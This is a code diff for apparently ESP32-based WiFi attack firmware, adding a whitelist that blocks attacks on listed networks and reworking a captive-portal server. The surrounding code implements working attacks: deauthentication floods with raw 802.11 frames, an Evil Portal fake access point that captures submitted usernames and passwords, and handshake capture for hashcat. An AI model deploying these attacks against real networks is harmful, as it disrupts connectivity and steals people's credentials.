@@ -20,6 +20,7 @@
 #include "MenuManager.h"
 #include "ModuleFlags.h"
 #include "Navigation.h"
+#include "NetGuard.h"
 #include "Orbit.h"
 #include "PcapTools.h"
 #include "Storage.h"
@@ -865,6 +866,12 @@ void runSniffer() {
         ui::message("Sniffer",
                     {"!Scrittura sulla microSD non riuscita.",
                      "Cattura interrotta. Controlla spazio", "e stato della card."},
+                    "WiFi");
+    } else if (hcStats.skippedNoEssid > 0) {
+        ui::message("Sniffer",
+                    {"hc22000: " + std::to_string(hcStats.skippedNoEssid) +
+                         " hash senza SSID",
+                     "esclusi: hashcat non puo'", "verificarli."},
                     "WiFi");
     }
 }
@@ -1925,6 +1932,31 @@ void runNetCut() {
     netcutRestoreAll();
 }
 
+// Whitelist condivisa: gli attacchi del menu WiFi la usano come WiFi Lab.
+// Fail-closed: senza file valido non parte alcuna trasmissione.
+bool whitelistReadyOrBlock(const char* parent) {
+    netguard::reload();
+    if (netguard::ready()) {
+        return true;
+    }
+    ui::message("Whitelist",
+                {"!Whitelist assente o non valida.", "Attacco bloccato.",
+                 "Crea /wifilab/whitelist.txt", "da WiFi Lab > Whitelist."},
+                parent);
+    return false;
+}
+
+uint8_t ssidLength(const std::string& ssid) {
+    return static_cast<uint8_t>(std::min<size_t>(ssid.size(), 32));
+}
+
+bool networkProtected(const Network& network) {
+    uint8_t bssid[6];
+    const bool valid = parseBssid(network.bssid, bssid);
+    return netguard::isProtected(valid ? bssid : nullptr, network.ssid.c_str(),
+                                 ssidLength(network.ssid));
+}
+
 void runDeauth() {
     if (!collectNetworks(g_networks) || g_networks.empty()) {
         return;
@@ -1937,6 +1969,19 @@ void runDeauth() {
         return;
     }
     const Network target = g_networks[choice];
+
+    if (!whitelistReadyOrBlock("WiFi")) {
+        return;
+    }
+    uint8_t bssid[6] = {0};
+    if (!parseBssid(target.bssid, bssid)) {
+        ui::message("Deauth", {"BSSID non valido."}, "WiFi");
+        return;
+    }
+    if (networkProtected(target)) {
+        ui::message("Deauth", {"Rete in whitelist.", "Attacco bloccato."}, "WiFi");
+        return;
+    }
 
     if (!ui::legalWarning("Deauth WiFi",
                           {"Invia frame 802.11 di disconnessione.",
@@ -1960,13 +2005,6 @@ void runDeauth() {
     }
     esp_wifi_set_channel(static_cast<uint8_t>(std::max(1, target.channel)),
                          WIFI_SECOND_CHAN_NONE);
-
-    uint8_t bssid[6] = {0};
-    if (!parseBssid(target.bssid, bssid)) {
-        stopPromiscuous();
-        ui::message("Deauth", {"BSSID non valido."}, "WiFi");
-        return;
-    }
 
     uint8_t frame[26] = {
         0xC0, 0x00, 0x00, 0x00,
@@ -2191,11 +2229,11 @@ void runBeaconSpam() {
 }
 
 void drawDeauthFlood(size_t targets, size_t index, uint32_t packets,
-                     uint32_t txFail, uint32_t remainingMs) {
+                     uint32_t txFail, uint32_t remainingMs, size_t excluded) {
     display::clear();
     display::header("Deauth Flood", "WiFi Atks");
-    textFormat(8, 30, display::kText, 2, "Reti target: %u",
-               static_cast<unsigned>(targets));
+    textFormat(8, 30, display::kText, 2, "Target: %u  WL: %u",
+               static_cast<unsigned>(targets), static_cast<unsigned>(excluded));
     textFormat(8, 52, display::kTextDim, 0, "Indice: %u",
                static_cast<unsigned>(index + 1));
     if (txFail) {
@@ -2220,6 +2258,9 @@ void runDeauthFlood() {
     if (!collectNetworks(g_networks) || g_networks.empty()) {
         return;
     }
+    if (!whitelistReadyOrBlock("WiFi")) {
+        return;
+    }
 
     struct Target {
         uint8_t bssid[6];
@@ -2227,9 +2268,15 @@ void runDeauthFlood() {
     };
     std::vector<Target> targets;
     targets.reserve(24);
+    size_t excluded = 0;
     for (const auto& network : g_networks) {
         Target target;
         if (!parseBssid(network.bssid, target.bssid)) {
+            continue;
+        }
+        if (netguard::isProtected(target.bssid, network.ssid.c_str(),
+                                  ssidLength(network.ssid))) {
+            ++excluded;
             continue;
         }
         target.channel = static_cast<uint8_t>(
@@ -2240,7 +2287,9 @@ void runDeauthFlood() {
         }
     }
     if (targets.empty()) {
-        ui::message("Deauth Flood", {"Nessun BSSID valido."}, "WiFi");
+        ui::message("Deauth Flood",
+                    {"Nessun target fuori whitelist.", "Modifica /wifilab/whitelist.txt."},
+                    "WiFi");
         return;
     }
 
@@ -2317,7 +2366,7 @@ void runDeauthFlood() {
         const uint32_t now = millis();
         if (now - lastDraw > 150) {
             drawDeauthFlood(targets.size(), index, packets, txFail,
-                            kMaxDuration - (now - start));
+                            kMaxDuration - (now - start), excluded);
             lastDraw = now;
         }
     }
@@ -2337,6 +2386,12 @@ std::vector<CapturedCredential> g_credentials;
 // g_credentials e' scritto dal task del server web e letto dal task della UI:
 // senza un lock un push_back in corsa con clear() corrompe l'heap.
 SemaphoreHandle_t g_credMtx = nullptr;
+
+// Il server HTTP resta allocato per tutta la vita del firmware: end() non
+// attende i callback in volo e distruggerlo sarebbe un use-after-free.
+AsyncWebServer* g_portalServer = nullptr;
+bool g_portalMode = false;
+char g_portalRedirect[32] = {0};
 
 void credLock() {
     if (g_credMtx == nullptr) {
@@ -2390,6 +2445,49 @@ const char kSuccessHtml[] = R"HTML(<!DOCTYPE html>
 <h2 style="color:#3fb950">Connessione in corso</h2>
 <p>Attendi mentre verifichiamo i dati.</p></body></html>)HTML";
 
+bool ensurePortalServer() {
+    if (g_portalServer != nullptr) {
+        return true;
+    }
+    g_portalServer = new (std::nothrow) AsyncWebServer(80);
+    if (g_portalServer == nullptr) {
+        return false;
+    }
+    g_portalServer->on("/", HTTP_GET, [](AsyncWebServerRequest* request) {
+        request->send(200, "text/html", g_portalMode ? kPortalHtml : kTwinHtml);
+    });
+    g_portalServer->on("/login", HTTP_POST, [](AsyncWebServerRequest* request) {
+        if (!g_portalMode) {
+            request->redirect(g_portalRedirect);
+            return;
+        }
+        // Limite esplicito: un AP aperto non deve accumulare form enormi.
+        if (request->contentLength() > 1024) {
+            request->send(413, "text/plain", "Richiesta troppo grande");
+            return;
+        }
+        CapturedCredential credential;
+        if (request->hasArg("username")) {
+            credential.username = request->arg("username").substring(0, 63).c_str();
+        }
+        if (request->hasArg("password")) {
+            credential.password = request->arg("password").substring(0, 63).c_str();
+        }
+        if (!credential.username.empty()) {
+            credLock();
+            if (g_credentials.size() < 20) {
+                g_credentials.push_back(credential);
+            }
+            credUnlock();
+        }
+        request->send(200, "text/html", kSuccessHtml);
+    });
+    g_portalServer->onNotFound([](AsyncWebServerRequest* request) {
+        request->redirect(g_portalRedirect);
+    });
+    return true;
+}
+
 void drawAccessPoint(const std::string& title, const Network& target,
                      const IPAddress& ip, int clients, bool portal,
                      uint32_t uptimeMs) {
@@ -2418,6 +2516,15 @@ void drawAccessPoint(const std::string& title, const Network& target,
 }
 
 void runFakeAccessPoint(const Network& target, bool portal) {
+    if (!whitelistReadyOrBlock("WiFi")) {
+        return;
+    }
+    if (networkProtected(target)) {
+        ui::message(portal ? "Evil Portal" : "Evil Twin",
+                    {"Rete in whitelist.", "Attacco bloccato."}, "WiFi");
+        return;
+    }
+
     const std::string ssid = target.ssid.empty() ? "WiFi_Test" : target.ssid;
     int channel = target.channel;
     if (channel < 1 || channel > 13) {
@@ -2436,38 +2543,28 @@ void runFakeAccessPoint(const Network& target, bool portal) {
 
     const IPAddress ip = WiFi.softAPIP();
     DNSServer dns;
-    dns.start(53, "*", ip);
 
-    AsyncWebServer server(80);
-    const String redirectUrl = "http://" + ip.toString() + "/";
-    if (portal) {
-        server.on("/", HTTP_GET, [](AsyncWebServerRequest* request) {
-            request->send(200, "text/html", kPortalHtml);
-        });
-        server.on("/login", HTTP_POST, [](AsyncWebServerRequest* request) {
-            CapturedCredential credential;
-            if (request->hasArg("username")) {
-                // Limite di lunghezza: un client puo' inviare stringhe enormi.
-                credential.username = request->arg("username").substring(0, 63).c_str();
-            }
-            if (request->hasArg("password")) {
-                credential.password = request->arg("password").substring(0, 63).c_str();
-            }
-            credLock();
-            if (!credential.username.empty() && g_credentials.size() < 20) {
-                g_credentials.push_back(credential);
-            }
-            credUnlock();
-            request->send(200, "text/html", kSuccessHtml);
-        });
-    } else {
-        server.on("/", HTTP_GET, [](AsyncWebServerRequest* request) {
-            request->send(200, "text/html", kTwinHtml);
-        });
+    // Mutex creato prima di server.begin(): i callback HTTP non devono
+    // correre con la creazione lazy del lock.
+    credLock();
+    credUnlock();
+    if (g_credMtx == nullptr || !ensurePortalServer()) {
+        WiFi.softAPdisconnect(true);
+        WiFi.mode(WIFI_OFF);
+        ui::message(portal ? "Evil Portal" : "Evil Twin",
+                    {"Memoria insufficiente per", "il server HTTP."}, "WiFi");
+        return;
     }
-    server.onNotFound([redirectUrl](AsyncWebServerRequest* request) {
-        request->redirect(redirectUrl);
-    });
+    g_portalMode = portal;
+    std::snprintf(g_portalRedirect, sizeof(g_portalRedirect), "http://%s/",
+                  ip.toString().c_str());
+
+    const bool dnsOk = dns.start(53, "*", ip);
+    if (!dnsOk) {
+        logger::warn("Access point di test: DNS captive non avviato");
+    }
+
+    AsyncWebServer& server = *g_portalServer;
     server.begin();
 
     const uint32_t start = millis();
@@ -2479,7 +2576,9 @@ void runFakeAccessPoint(const Network& target, bool portal) {
         if (navigation::poll().type == navigation::Event::Back) {
             break;
         }
-        dns.processNextRequest();
+        if (dnsOk) {
+            dns.processNextRequest();
+        }
         const uint32_t now = millis();
         if (now - lastDraw > 250) {
             drawAccessPoint(portal ? "Evil Portal" : "Evil Twin", target, ip,
@@ -2490,12 +2589,21 @@ void runFakeAccessPoint(const Network& target, bool portal) {
     }
 
     server.end();
-    dns.stop();
-    WiFi.softAPdisconnect(true);
-    WiFi.mode(WIFI_OFF);
+    // Da qui i POST vengono solo rediretti; i callback gia' entrati hanno 250
+    // ms per finire, poi si svuota la RAM. Il server non viene distrutto.
+    g_portalMode = false;
+    const uint32_t graceStart = millis();
+    while (millis() - graceStart < 250) {
+        delay(5);
+    }
     credLock();
     g_credentials.clear();
     credUnlock();
+    if (dnsOk) {
+        dns.stop();
+    }
+    WiFi.softAPdisconnect(true);
+    WiFi.mode(WIFI_OFF);
     logger::info("Access point di test chiuso");
 }
 
